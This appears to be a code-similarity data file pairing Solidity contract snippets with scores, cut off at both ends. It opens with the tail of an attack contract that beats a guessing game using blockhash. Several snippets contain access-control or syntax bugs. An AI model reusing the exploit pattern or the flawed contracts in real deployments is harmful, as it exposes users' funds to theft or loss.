        if(g.guessMe(uint(blockhash(block.number)))) {
            emit LogSuccess(msg.sender, true);
        }
    }
}",0.6278748125412071,"contract Test {

    event testLog(address indexed account, uint amount);

    

    constructor() public {

        emit testLog(msg.sender, block.number);

    }

    

    function execute(uint number) public returns (bool) {

        emit testLog(msg.sender, number);

        return true;

    }

}"
contract A { function A(bool) { ... }},0.6959987873152085,"contract Hello {

    function Hello() {

    }
}"
"contract Storage {

    mapping(uint => bytes32) public byteMap;

    function setStorage(uint key, bytes32 value) public returns(bool success) {
        byteMap[key] = value;
        return true;
    }

    function getStorage(uint key) public constant returns(bytes32 value) {
        return byteMap[key];
    }
}",0.6407375844531586,"contract Utils {

  function testrc(bytes32 hash, uint8 v, bytes32 r, bytes32 s) public pure returns(address) {

    return ecrecover(hash, v, r, s);

  }



  function hash(uint x, uint y, uint z, uint w) public pure returns(bytes32) {

    return sha3(x,y,z,w);

  }

}"
"contract Client {

    Storage datastore;

    function Client(address storageAddress) public {
        datastore = Storage(storageAddress);
    }

    function setValue(uint key, bytes32 value) public returns(bool success) {
        datastore.setStorage(key, value);
        return true;
    }

    function getValue(uint key) public constant returns(bytes32 value) {
        return datastore.getStorage(key);
    }
}",0.6401875754919217,"contract ERC223Interface {

    function balanceOf(address who) public constant returns (uint);



    function transfer(address to, uint value) public returns (bool);



    function transfer(address to, uint value, bytes data) public returns (bool);



    event Transfer(address indexed from, address indexed to, uint value, bytes data);

}"
"contract Airdrop {
    address public owner;
    mapping(address => uint256) public balances;

    constructor() public {
        owner = msg.sender;
    }

    function transferBatch(IERC20Token _token, address[] _targets, uint256[] _amounts) external {
        require(msg.sender == owner);
        uint256 length = _targets.length;
        require(length == _amounts.length);
        for (uint256 i = 0; i < length; i++) {
            address target = _targets[i];
            uint256 amount = _amounts[i];
            require(balances[target] == 0);
            require(_token.transfer(target, amount));
            balances[target] = amount;
        }
    }
}",0.6762117144769965,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  function transfer(address _to, uint256 _amount) public returns (bool) {
    uint256 _value = _amount;
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
  
    

}"
"contract Factory {
  ...
  
  event ContractCreated(address _contract, bytes32 _name, uint _index);

  function createContract (bytes32 name) public {
    address newContract = new Contract(name);
    newContracts.push(newContract);

    
    ContractCreated(newContract, name, newContracts.length - 1);
  } ",0.6295476139574707,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract DB {

  address public owner;
  mapping(address => bool) public allowedContracts;

  modifier onlyAllowedContracts() {
      require(allowedContracts[msg.sender]);
      _;
  }

  modifier onlyOwner {
      require(msg.sender == owner);
      _;
  }

  constructor() public {
      owner = msg.sender;
  }

  function isAllowedContract(address check) public view returns(bool isIndeed) {
      return allowedContracts[check];
  }

  function addAllowedContract(address newContract) public onlyOwner returns(bool success) {
      require(!isAllowedContract(newContract));
      allowedContracts[newContract] = true;
      return true;
  }

  function removeAllowedContract(address newContract) public returns(bool success) {
      require(isAllowedContract(msg.sender));
      allowedContracts[newContract] = false;
      return true;
  }

  function insertNewDataRecords() public onlyAllowedContracts returns(bool success) {
      
      return true;
  }
}",0.6241916413490814,"contract requiringAuthorization is mortal {

	

	mapping(address => bool) public authorized;

	

	mapping(address => bool) public allowedReceiver;



	modifier onlyAuthorized {

		require(authorized[msg.sender]);

		_;

	}



	

	function requiringAuthorization() internal {

		authorized[msg.sender] = true;

		allowedReceiver[msg.sender] = true;

	}



	

	function authorize(address addr) public onlyOwner {

		authorized[addr] = true;

	}



	

	function deauthorize(address addr) public onlyOwner {

		authorized[addr] = false;

	}



	

	function allowReceiver(address receiver) public onlyOwner {

		allowedReceiver[receiver] = true;

	}



	

	function disallowReceiver(address receiver) public onlyOwner {

		allowedReceiver[receiver] = false;

	}



	

	function changeOwner(address newOwner) public onlyOwner {

		deauthorize(owner);

		authorize(newOwner);

		disallowReceiver(owner);

		allowReceiver(newOwner);

		owner = newOwner;

	}

}"
"contract Test {
    uint256 public a;
    constructor (uint256 _a) public {
        a = _a;
    }
}",0.6744467016730721,"contract Token {

	uint8 public decimals;



  	constructor () public {

		decimals = 24;

  	}

}"
"contract DeployTest {
    function deploy() public {
        new Contract{salt: 0x1234}(123);
    }
}",0.6039124508059721,"contract ContractConn {

    function transfer(address _to, uint _value) public;

}"
"contract Parent{
  function fallback() internal {
    log0(""Parent fallback function"");
  }

  function (){
     fallback();
  }
}",0.6228311981251365,"contract HelloEx{



	function own(address owner) {}



	function releaseFunds(uint amount) {}



	function lock() {}

}"
"contract Token {
   function getInt() constant returns(uint) {
       return 1;
   }
}",0.6978175221252172,"contract BonusCalculator {
    function getBonus() constant returns (uint);
}"
"contract ERC223Receiver {
    function tokenReceiveLogic1() internal {
        
        
    }

    function tokenReceiveLogic2() internal {
        
        
    }


    function tokenFallback(
        address _sender,
        uint256 _value,
        bytes _extraData) returns (bool) {

        require(_value > 10);
        return true;
        
        
        
        
        
    }
}",0.6491448077096136,"contract FallBackToken is StandardToken {
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(super.transfer(_to, _value));
        if (AddressUtils.isContract(_to)) {
            Receiver(_to).tokenFallback(msg.sender, _value);
        }
        return true;
    }
}"
"contract Token {
    function transfer(address to, uint value) public {
        bytes memory empty;
        bool shouldFail = ERC223Receiver(to).tokenFallback(msg.sender,value,empty);
        

    }
}",0.6482637118490959,"contract TransferAndCallFallBack 
{
    function receiveToken(address from, uint256 tokens, address token, bytes memory data) public returns (bool);
}"
"contract Contract2 {
    Contract1 public contract1 = new Contract1();
    function func() public returns (uint32, uint32) {...}
}",0.6701958798179706,"contract XRateProvider {

    
    
    function getRate() public returns (uint32 , uint32 );

    
    function getCode() public returns (string);
}"
"contract A {
    uint tokens = 10;
    
    address allowedBurnerAddress = 0x1234;

    
    function burn(uint amount) public {
        require(msg.sender == allowedBurnerAddress);
        tokens -= amount;
    }
}",0.6548878304152619,"contract ServiceAllowance {

    function isTransferAllowed(address _from, address _to, address _sender, address _token, uint _value) public view returns (bool);

}"
"contract Test {

    struct Request {
        function(uint) external callback;
    }

    Request[] private requests;

    function getAddress (uint requestID) public view returns (address) {
        return address(requests[requestID].callback);
    }
}",0.6230012205877953,"contract MBLToken {

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function balanceOf(address _tokenOwner) external view returns (uint balance);



 }"
"contract AddressArray {

    address[] addresses;

    function AddressArray(uint dummy1, address[] addresses_, uint dummy2) {
        for (uint i = 0; i < addresses_.length; i++) {
            addresses.push(addresses_[i]);
        }
    }

    function getNumberOfAddresses() constant returns (uint) {
        return addresses.length;
    }

    function getAddress(uint i) constant returns (address) {
        return addresses[i];
    }
}",0.6176423963923642,"contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) constant returns (uint);
  function transferFrom(address from, address to, uint value) returns (bool);
  function approve(address spender, uint value) returns (bool);
  event Approval(address indexed owner, address indexed spender, uint value);
}"
"contract Crowdsale {
    ERC20I public tokenInterface;
    function Crowdsale(address _tokenAddress) {
        tokenInterface = ERC20I(_tokenAddress);
    }
}",0.6307352766431832,"contract ERC20Interface {
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
}"
"contract A {

    event Log(address addr);

    function() external {
        emit Log(bytesToAddress(msg.data));
    }

    function bytesToAddress(bytes memory source) public pure returns(address addr) {
        assembly {
            addr := mload(add(source, 0x14))
        }
    }
}",0.6109086828416753,"contract Resolver {

    function supportsInterface(bytes4 interfaceID) public pure returns (bool);

    function addr(bytes32 node) public view returns (address);

    function setAddr(bytes32 node, address addr) public;

}"
"contract MyContract {
    function func1(bytes32 b) public pure returns (address) {
        return address(uint160(bytes20(b)));
    }
    function func2(bytes32 b) public pure returns (address) {
        return address(uint160(uint256(b)));
    }
    function func3(uint256 b) public pure returns (address) {
        return address(uint160(bytes20(b)));
    }
    function func4(uint256 b) public pure returns (address) {
        return address(uint160(uint256(b)));
    }
}",0.6967514169971377,"contract TokenInterface {
    function allowance(address, address) public returns (uint256);

    function balanceOf(address) public returns (uint256);

    function approve(address, uint256) public;

    function transfer(address, uint256) public returns (bool);

    function transferFrom(address, address, uint256) public returns (bool);

    function deposit() public payable;

    function withdraw(uint256) public;
}"
"contract ArrayTest {
    uint [] public numbers;
    function getNumberCount() public view returns(uint count) {
        return numbers.length;
    }
    function addIfNotPresent(uint num) public{
        uint arrayLength = numbers.length;
        bool found=false;
        for (uint i=0; i<arrayLength; i++) {
            if(numbers[i]==num){
                found=true;
                break;
            }
        }
        if(!found){
            numbers.push(num);
        }
    }
}",0.6149218155683615,"contract MultiEthSender {

    

    event Send (

        uint256 _amount,

        address indexed_receiver

    );



    function multiSendEth(uint256 amount, address[] list) public returns (bool) {

        uint listLength = list.length;

        for (uint i=0; i<listLength; i++) {

            list[i].transfer(amount);

            emit Send(amount, list[i]);

        }

        

        return true;

    }

    

    function () external payable {}



}"
"contract CustTest { 
  mapping(address => CustList ) public customers;
  function createProfile() public { 
    customers[msg.sender] = new CustList(); 
  } 
}",0.6188938179888135,"contract loglibs {
   mapping (address => uint256) public sendList;
   
   function logSendEvent() payable public{
        sendList[msg.sender] = 1 ether;
   }

}"
"contract MyContract {
    uint x;
    function func(uint _x) public {
        require(x != _x);
        x = _x;
    }
}",0.6544594573277565,"contract FiatContract {

    function USD(uint _id) constant public returns (uint256);

}"
"contract OrganisationsFactory {
    address[] organizations;
    event LogCreatedOrg(address indexed hsAddr, string name, string vat, string headquarterAddress);

    function add(string name, string vat, string headquarterAddress) public returns(address) {
        OrganizationObject newOrg = new OrganizationObject(name, vat, headquarterAddress);
        organizations.push(newOrg);
        LogCreatedOrg(newOrg, name, vat, headquarterAddress);
        return newOrg;
    }

    function getOrgAtIndex(uint index) public constant returns(address org){
        return organizations[index];
    }

    function getOrganizationCount() public constant returns(uint count) {
        return organizations.length;
    }
}",0.6070667744482254,"contract StandardNFTFactory {
    address[] public contracts;
    address public lastContractAddress;
    
    event newStandardNFTContract (
       address contractAddress
    );

    constructor()
        public
    {

    }

    function getContractCount()
        public
        view
        returns(uint contractCount)
    {
        return contracts.length;
    }

    function newStandardNFT(string memory name, string memory symbol, address minter)
        public
        returns(address newContract)
    {
        StandardNFT c = new StandardNFT(name, symbol, minter);
        contracts.push(c);
        lastContractAddress = address(c);
        return c;
    }

    function seeStandardNFT(uint pos)
        public
        view
        returns(address contractAddress)
    {
        return address(contracts[pos]);
    }
}"
"contract Test {

    mapping(int => uint8) one;
    mapping(int => uint256) two;
    int counter = 0;

    function pushOne() public {
        one[counter++] = 1;
    }

    function pushTwo() public {
        two[counter++] = 256;
    }

}",0.6183861675427262,"contract MintableToken {
  event Mint(address indexed to, uint256 amount);
  function leave() public;
  function mint(address _to, uint256 _amount) public returns (bool);
}"
"contract C {
    function bytes32ToString(bytes32 x) constant returns (string) {
        bytes memory bytesString = new bytes(32);
        uint charCount = 0;
        for (uint j = 0; j < 32; j++) {
            byte char = byte(bytes32(uint(x) * 2 ** (8 * j)));
            if (char != 0) {
                bytesString[charCount] = char;
                charCount++;
            }
        }
        bytes memory bytesStringTrimmed = new bytes(charCount);
        for (j = 0; j < charCount; j++) {
            bytesStringTrimmed[j] = bytesString[j];
        }
        return string(bytesStringTrimmed);
    }

    function bytes32ArrayToString(bytes32[] data) returns (string) {
        bytes memory bytesString = new bytes(data.length * 32);
        uint urlLength;
        for (uint i=0; i<data.length; i++) {
            for (uint j=0; j<32; j++) {
                byte char = byte(bytes32(uint(data[i]) * 2 ** (8 * j)));
                if (char != 0) {
                    bytesString[urlLength] = char;
                    urlLength += 1;
                }
            }
        }
        bytes memory bytesStringTrimmed = new bytes(urlLength);
        for (i=0; i<urlLength; i++) {
            bytesStringTrimmed[i] = bytesString[i];
        }
        return string(bytesStringTrimmed);
    }    
}",0.6201540391223983,"contract StrikersMetadata {

  
  
  string public apiUrl;

  constructor(string _apiUrl) public {
    apiUrl = _apiUrl;
  }

  
  
  
  
  function tokenURI(uint256 _tokenId) external view returns (string) {
    string memory _id = uint2str(_tokenId);
    return strConcat(apiUrl, _id);
  }

  
  

  function strConcat(string _a, string _b) internal pure returns (string) {
    bytes memory _ba = bytes(_a);
    bytes memory _bb = bytes(_b);
    string memory ab = new string(_ba.length + _bb.length);
    bytes memory bab = bytes(ab);
    uint k = 0;
    for (uint i = 0; i < _ba.length; i++) bab[k++] = _ba[i];
    for (i = 0; i < _bb.length; i++) bab[k++] = _bb[i];
    return string(bab);
  }

  function uint2str(uint i) internal pure returns (string) {
    if (i == 0) return ""0"";
    uint j = i;
    uint len;
    while (j != 0) {
      len++;
      j /= 10;
    }
    bytes memory bstr = new bytes(len);
    uint k = len - 1;
    while (i != 0) {
      bstr[k--] = byte(48 + i % 10);
      i /= 10;
    }
    return string(bstr);
  }
}"
"contract Proxy {
  address private _owner;
  address private _dest;

  constructor(address dest) public {
    _owner = msg.sender;
    _dest = dest;
  }

  function getDest() public view returns(address) {
    return _dest;
  }

  function setDest(address dest) public {
    require(msg.sender == _owner);
    _dest = dest;
  }

  
  function invoke(string memory method, bytes memory data) public payable {
    require(data.length >= 64, 'Insufficient space in payload');
    assembly {
        mstore(add(data, 0x20), caller())
        mstore(add(data, 0x40), callvalue())
    }
    bytes memory payload = abi.encodePacked(bytes4(keccak256(bytes(method)))), data);
    (bool ok, bytes memory response) = _dest.call(payload);
  }
}",0.6196811957102824,"contract Adoption {

  address[16] public adopters;

  uint[16] public prices;

  address public owner;



  constructor() public {

    owner = msg.sender;

    for (uint i=0;i<16;++i) {

      prices[i] = 0.001 ether;  

    }

  }



  

  function adopt(uint petId) public payable returns (uint) {

    require(petId >= 0 && petId <= 15);

    require(msg.value >= prices[petId]);



    prices[petId] *= 120;

    prices[petId] /= 100;



    adopters[petId] = msg.sender;

    return petId;

  }



  

  function getAdopters() public view returns (address[16] memory, uint[16] memory) {

    return (adopters,  prices);

  }

  

  modifier onlyOwner() {

        require (msg.sender == owner);

        _;

      }

  function withdraw() public onlyOwner{

    msg.sender.transfer(address(this).balance);

  }

}"
"contract Stratus {

    string public greeting;
    address public owner;

    event GreetingChanged (string oldGreeting, string newGreeting);

    constructor(string memory _greeting) public {
        greeting = _greeting;
        owner = msg.sender;
    }

    function setGreeting (string memory _greeting) public {
        require(owner == msg.sender);
        emit GreetingChanged(greeting,_greeting);
        greeting = _greeting;
        }
    }",0.6113008908682499,"contract Database {

    address public owner;

    constructor() public {
      owner = msg.sender;
    }
    
    function withdraw() public {
      require(msg.sender == owner);
      owner.transfer(address(this).balance);
    }

    
    
    event Table(uint256 indexed _row, string indexed _column, string indexed _value);
    

    function put(uint256 _row, string _column, string _value) public {
        emit Table(_row, _column, _value);
    }
}"
"contract SetGet {

    uint[] public numbers;

    event LogNewNumber(address setter, uint number);

    function appendNumber(uint value) public {
        numbers.push(value);
        emit LogNewNumber(msg.sender, value);
    }
}",0.6414222646859987,"contract showNum {
    address owner = msg.sender;

    uint _num = 0;
   function setNum(uint number) public payable {
        _num = number;
    }

    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract Foo {
    function getRange(uint n) public pure returns(uint[]) {
        uint[] memory result = new uint[](n);
        for (uint i = 0; i < n; i++)
            result[i] = i;
        return result;
    }
}",0.6683216136089647,"contract Zhtong {
    address public owner;
      uint private result;
      function Set(){
          owner = msg.sender;
      }
      function assign(uint x, uint y) returns (uint){
          result = x + y;
      }
}"
"contract foreignContract {
 string name;


 function changeName(string Name) public returns(bool) {
  name = Name;
  return true;
 }

 function receiveName() public view returns(string) {
  return name;
 }
}",0.6656629527479816,"contract PausedEURON is PausedToken {

    function name() public pure returns (string memory) {

        return ""EURON"";

    }



    function symbol() public pure returns (string memory) {

        return ""ERN"";

    }

}"
"contract Factory {

function at(address _addr) private view returns (bytes memory o_code) {
    assembly {
        
        let size := extcodesize(_addr)
        
        
        o_code := mload(0x40)
        
        mstore(0x40, add(o_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
        
        mstore(o_code, size)
        
        extcodecopy(_addr, add(o_code, 0x20), 0, size)
    }
}

function create(address _addrOfCode) returns (address){
    address retval;
    assembly{
        mstore(0x0, or (0x5880730000000000000000000000000000000000000000803b80938091923cF3 ,mul(_addrOfCode,0x1000000000000000000)))
        retval := create(0,0, 32)
    }
    return retval;
}
}",0.6025719265473566,"contract UserProxy {



    

    function execute(address _target, bytes _data) public payable returns (bytes response) {

        require(_target != address(0), ""user-proxy-target-address-required"");

        assembly {

            let succeeded := delegatecall(sub(gas, 5000), _target, add(_data, 0x20), mload(_data), 0, 0)

            let size := returndatasize



            response := mload(0x40)

            mstore(0x40, add(response, and(add(add(size, 0x20), 0x1f), not(0x1f))))

            mstore(response, size)

            returndatacopy(add(response, 0x20), 0, size)



            switch iszero(succeeded)

                case 1 {

                    

                    revert(add(response, 0x20), size)

                }

        }

    }



}"
"contract Adder {
uint256 public param;

constructor(){
    param = 5;
}

function add(uint a, uint b) returns (uint){
    return a+b;
}
}",0.6855874751757286,"contract Kicker {
    function kick(address urn, address gal, uint tab, uint lot, uint bid)
        public returns (uint);
}"
"contract Tester {

Adder a;

function Tester(address factory,address adder){
    address cAdr = Factory(factory).create(adder);
    a = Adder(cAdr);
    if(address(a) == 0) throw;
}

function test(uint x, uint y) constant returns (uint){
    return a.add(x,y);
}

function getParam() constant returns (uint){
    return a.param();
}
}",0.6566011867685124,"contract ERC20Token {
  function balanceOf(address _who) constant returns (uint balance);
  function allowance(address _owner, address _spender) constant returns (uint remaining);
  function transferFrom(address _from, address _to, uint _value);
  function transfer(address _to, uint _value);
}"
"contract LocalVariableTest {
    function assignValue() public {
        uint256 k = 2;
    }
}",0.6745563299880525,"contract Mintable {
    function mint(address to, uint256 amount) public;
}"
"contract init {        
    ERC20Interface token;

    function test() public view {    
        require(address(token) != address(0));
    }
}",0.6962501234937561,"contract Exchange {

  function balanceOf(address token, address user) public view returns (uint);

}"
"contract Test {

  byte[20] v;

  function set() {
    var v1 = v;
    v1[0] = 1;
    
  }

  function get() constant returns(byte value) {
    return(v[0]);
  }

}",0.6384919406337349,"contract f {
    function a() constant returns (string b){
        return ""tickletickle vac ban in csgo march 10 2017"";
    }
}"
"contract Simple {

    uint public number;

    function set(uint _number) public {
        number = _number;
    }
}",0.6391821503476268,"contract SaiVox {
    function par() public returns (uint);
    function way() public returns (uint);
}"
"contract UintToStr {  
     function UintToString(uint v) constant returns (string) {
          bytes32 ret;
            if (v == 0) {
                 ret = '0';
            }
            else {
                 while (v > 0) {
                      ret = bytes32(uint(ret) / (2 ** 8));
                      ret |= bytes32(((v % 10) + 48) * 2 ** (8 * 31));
                      v /= 10;
                 }
            }

            bytes memory bytesString = new bytes(32);
            for (uint j=0; j<32; j++) {
                 byte char = byte(bytes32(uint(ret) * 2 ** (8 * j)));
                 if (char != 0) {
                      bytesString[j] = char;
                 }
            }

            return string(bytesString);
      }
}",0.6945327850188212,"contract displayable {

  function bytes32ToString(bytes32 x) public pure returns (string) {

    bytes memory bytesString = new bytes(32);

    uint256 charCount = 0;

    for (uint256 j = 0; j < 32; j++) {

      if (x[j] != 0) {

        bytesString[charCount] = x[j];

        charCount++;

      }

    }

    bytes memory bytesStringTrimmed = new bytes(charCount);

    for (j = 0; j < charCount; j++) {

      bytesStringTrimmed[j] = bytesString[j];

    }

    return string(bytesStringTrimmed);

  }

}"
"contract delegatedcalled {
  uint public numberxxxx;
  address public callerAddress;
  function setNumber(uint _number) {
    numberxxxx = _number;
    callerAddress = msg.sender;
  }
}",0.6591920436723988,"contract NumberFactory{
    event NumberCreated(address);
    address public last;
 function createNumber(uint _number) public {
     last= new Number(_number);
     NumberCreated(last);
     
    
 } 
}"
"contract Example {

    mapping(address => uint) public values;
    mapping(address => bool) public usedAddresses;


    function update(uint newVal) {

        values[msg.sender] = newVal;
        usedAddresses[msg.sender] = true;
    }

    function dosomethiingwithval(){

        if(usedAddresses[msg.sender]){ 

             
        }
    }

}",0.6153342767252694,"contract Token
{
   mapping(address => mapping (address => uint256)) allowed;
   function transfer(address to, uint256 value) public returns (bool);
   function transferFrom(address from, address to, uint256 value) public returns (bool);
}"
"contract SomeContract {
    address tokenAddress;
    MyToken token;    

    
    
    function setTokenAddress(address _tokenAddress) public {
        tokenAddress = _tokenAddress;
        token = MyToken(_tokenAddress);
    }

    function GiveMeTokens() public payable {
        if (msg.value > 0.000000001) {
            
            
            token.transfer(msg.sender, 1000);
        }
    }
}",0.6261797267842786,"contract MultiTransfer is MultiOwnable {
    
    function MultiTransaction(address _tokenAddress, address[] _addresses, uint256[] _values) public onlyOwner {
        SNOVToken token = SNOVToken(_tokenAddress);
        for (uint256 i = 0; i < _addresses.length; i++) {
            token.transfer(_addresses[i], _values[i]);
        }
    }
}"
"contract U256 {

    struct Request{
        string name;
        uint a;
        uint b;
        uint c;
        uint d;
        uint e;
        address a1;
        address a2;
    }

    Request[] contracts;
    uint index;

    constructor() public {
        contracts.push(Request('first',1,2,3,4,5,address(0),address(0)));
        contracts.push(Request('second',2,3,4,5,6,address(0),address(0)));
    }

    function getdeployedcontracts () public returns (string memory, uint,uint,uint,uint,uint,address,address) {

        Request memory request = contracts[index];

        index += 1;

        return (request.name,
                request.a,
                request.b,
                request.c,
                request.d,
                request.e,
                request.a1,
                request.a2);
    }
}",0.6019733636051476,"contract LLCTokenFactory {

  

  mapping (address => bool) public validContracts; 
  address[] public contracts;

  

  function getContractCount() 
    public
    view
    returns(uint contractCount)
  {
    return contracts.length;
  }

  

  function getDeployedContracts() public view returns (address[] memory)
  {
    return contracts;
  }

  

  function newLLCToken(string memory name, string memory symbol, uint256 init, address owner)
    public
    returns(address)
  {
    LLCToken c = new LLCToken(name, symbol, init, owner);
    validContracts[c] = true;
    contracts.push(c);
    return c;
  }
}"
"contract Test {
    uint256 public rate;

    function setRate(uint256 _rate) {
        rate = _rate;
    }
}",0.6512557001945704,"contract Trader {

    function buy(address _from, uint256 _tokenId, uint256 _count) public;

}"
"contract Exchange {
  address public admin;

  modifier onlyAdmin {
    require(msg.sender == admin);
    _;
  }

  function Exchange() {
    admin = msg.sender;
  }

  function changeAdmin(address _newAdmin) onlyAdmin {
    require(_newAdmin != address(0));
    admin = _newAdmin();
  }

  function deposit() payable {
  }

  function settle(address _winner) onlyAdmin {
    selfdestruct(_winner);
  }
}",0.6752088713310344,"contract Adminable is Ownable {
  mapping(address => bool) public admins;

  modifier onlyAdmin() {
    require(admins[msg.sender]);
    _;
  }

  function addAdmin(address user) onlyOwner public {
    require(user != address(0));
    admins[user] = true;
  }

  function removeAdmin(address user) onlyOwner public {
    require(user != address(0));
    admins[user] = false;
  }
}"
"contract Contract {
    uint8 public value;
    function call_library_function () {
        value = Library.func();
    }
}",0.6230895090666803,"contract ContractReceiver {
  function tokenFallback(address from, uint value) public;
}"
"contract A {
    uint256 public lastFundSentToContract = 0;
    
    function updateLastFundSentToContract () public payable {
        lastFundSentToContract = msg.value;
    }
    
    function getContractBalance() public view returns(uint256) {
        return address(this).balance;
    }
}",0.6345076136607583,"contract SimpleWallet is Ownable {



    function () public payable {

    }



    function weiBalance() public constant returns(uint256) {

        return this.balance;

    }



    function claim(address destination) public onlyOwner {

        destination.transfer(this.balance);

    }



}"
"contract Secrets {
    
    mapping(bytes32 => uint) public secrets;
    
    function remit(bytes32 secret) public payable {
        secrets[secret] += msg.value;
    }
    
    function claim(bytes32 magic) public {
        bytes32 secret = keyGen(msg.sender, magic);
        uint amount = secrets[secret];
        require(amount > 0, ""There is no money for you."");
        secrets[secret] = 0;
        msg.sender.transfer(amount);
    }
    
    function keyGen(address a, bytes32 magic) public pure returns(bytes32 secret) {
        secret = keccak256(abi.encodePacked(a, magic));
    }
    
}",0.6178684140266968,"contract Storage {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    mapping(bytes32 => string) data;

    function set(bytes32 key, string memory value) public {
        require(
            bytes(data[key]).length == 0,
            ""username has already been taken""
        );
        data[key] = value;
    }

    function get(bytes32 key) public view returns (string memory) {
        return data[key];
    }

    function del(bytes32 key) public {
        require(msg.sender == owner, ""only the owner can delete names"");
        delete data[key];
    }
}"
"contract TokenContract { 
    uint256 freezingPossible = 1539060104; 
    address oneFrozen = 0x123;


    function transfer(address to, uint tokens) public returns (bool success) {
        if (now < freezingPossible) {
            require(to != oneFrozen, ""The account should not be frozen"");
        }
        
    }
}",0.6562945417028658,"contract TokensContract {

    function balanceOf(address who) public constant returns (uint256);

    function transferFrom(address _from, address _to, uint _value) returns (bool success);

    function approve(address _spender, uint _value) returns (bool success);

}"
"contract dCoders {
 
 
 address public owner;
 uint public regFee;

 mapping (address => uint) public balance; 

  constructor() public {
  owner = msg.sender;
  regFee = 2 ether;
  }

  event reg(address indexed _from);

  
 function register() payable external {
 require(msg.value == 2 ether);
 balance[address(this)] += regFee;     
 emit reg(msg.sender); 
 }

 

  

  }",0.6966478527427121,"contract Destructible {





    address _owner; 



 

    event receipt(address indexed investor, uint value);





    modifier onlyOwner() {

        require(msg.sender == _owner);

        _;

    }



   

    constructor() public {

        _owner = msg.sender;

    }



    

    function() payable public {

        emit receipt(msg.sender, msg.value);

    }

       

    



    function destroyAndSend(address _recipient) onlyOwner() public {

        selfdestruct(_recipient);

    }



}"
"contract Test {
    IERC20 dc = IERC20(0xaD6D458402F60fD3Bd25163575031ACDce07538D);

    function balanceOf(address _val) public view returns (uint256) {
        return dc.balanceOf(_val);
    }
}",0.6363269884299679,"contract ERC20 {
  function transfer(address to, uint256 value) public returns (bool);
  function balanceOf(address _owner) public view returns (uint256 balance);
}"
"contract A { 
   function f1(bool arg1, uint arg2) returns(uint); 
}",0.6661527272265012,"contract ValueLike {
    function peek() public returns (uint, bool);
}"
"contract YourContract {
  function doYourThing(address addressOfA) returns(uint) {
    A my_a = A(addressOfA);
    return my_a.f1(true, 3);
  }
}",0.6313045709963974,"contract Token {
	function balanceOf(address addr) returns(uint);
	function transfer(address to, uint amount) returns(bool);
}"
"contract test {

struct user {
    string name;
    address add;
}

mapping (address => user) public userRegister;

 function add_user (string name, address addr)   {  
     userRegister[addr].name=name;  
      userRegister[addr].add=addr;  
}


function clearStruct (address addr)   {  
   delete userRegister[addr];  

}

function try_it (address addr)  returns (string name) {  

   return userRegister[addr].name ;
}
}",0.618207016858876,"contract OraclizeAddrResolver {



    address public addr;



    address owner;



    function OraclizeAddrResolver(){

        owner = msg.sender;

    }



    function changeOwner(address newowner){

        if (msg.sender != owner) throw;

        owner = newowner;

    }



    function getAddress() returns (address oaddr){

        return addr;

    }



    function setAddr(address newaddr){

        if (msg.sender != owner) throw;

        addr = newaddr;

    }



}"
"contract Elapsed {

    function stopwatch() public view returns(uint duration) {
      uint start = now;
      for (uint i=0; i<9999; i++) {
        
      }
      uint end = now;
      duration = end - start;
    }
}",0.6157526839899579,"contract VoxInterface {

    function par() public view returns (uint);

    function way() public view returns (uint);

    function era() public view returns (uint);

}"
"contract Base {

    uint public dataA;
    bytes32 public dataB;

    function setAB(uint a, bytes32 b) public {
        dataA = a;
        dataB = b;
    }

    function getA() public view returns(uint) {
        return dataA ;
    }

    function getB() public view returns(bytes32) {
        return dataB ;
    }

}",0.6808391038590232,"contract ERC20BadInterface {
  function name() public view returns (bytes32);
  function symbol() public view returns (bytes32);
  function decimals() public view returns (uint8);
  function balanceOf(address _owner) public view returns (uint256 balance);
}"
"contract Extra {

   Base base;

   function Extra() public {
       base = new Base();
   }

   function getBaseAddres() public view returns(address) {
       return address(base);
   }

   function baseGetA() public view returns(uint) {
        return base.getA();
   }

   function baseGetB() public view returns(bytes32) {
       return base.getB();
   }

   function baseSetAB(uint a, bytes32 b) public returns(bool success) {
       base.setAB(a,b);
       return true;
   }
}",0.642374642296723,"contract IWithRules {

  function ruleLength() public view returns (uint256);

  function rule(uint256 _ruleId) public view returns (IRule);

  function validateAddress(address _address) public view returns (bool);

  function validateTransfer(address _from, address _to, uint256 _amount)

    public view returns (bool);



  function defineRules(IRule[] _rules) public;



  event RulesDefined(uint256 count);

}"
"contract Uniswap {

   event Triggered(address indexed user);

   function addLiquidity() external {
       emit Triggered(msg.sender);
   }

}",0.6027059563648303,"contract Vote {
    event LogVote(address indexed addr);

    function() {
        LogVote(msg.sender);

        if (msg.value > 0) {
            msg.sender.send(msg.value);
        }
    }
}"
"contract B is A {
  

  function doAnotherThing() public {
    
    doSomething();
  }
}",0.6067812046071164,"contract JoinLike {
    function dai() public view returns (GemLike);
}"
"contract A is C {

  function doThing1() {}

}",0.6302932592526421,"contract MSD8 {

    

    function hifus() public {

        

    }

}"
"contract B is C {

  function doThing2() {}

}",0.6302932592526421,"contract MSD8 {

    

    function hifus() public {

        

    }

}"
"contract Escrow {

    ERC20 token = ERC20(0xABCDEF....);

    event Deposit(address sender, uint amount);
    event Withdraw(address sender, uint amount);

    mapping (address => uint) deposits;

    
    function deposit(uint amount) public {
        
        token.transferFrom(msg.sender, amount);
        deposits[msg.sender] += amount;

        emit Deposit(msg.sender, amount);
    }

    function withdraw(uint amount) public {
        
        require(deposits[msg.sender] >= amount);

        
        if (condition) {
            
            deposits[msg.sender] -= amount;
            token.transfer(msg.sender, amount);

            emit Withdraw(msg.sender, amount);
        } else {
            revert();
        }
    }
}",0.6585278325404912,"contract electrolightTestnet {

    

    

    address public minter;

    

    

    mapping (address => uint) public balances;

    

    
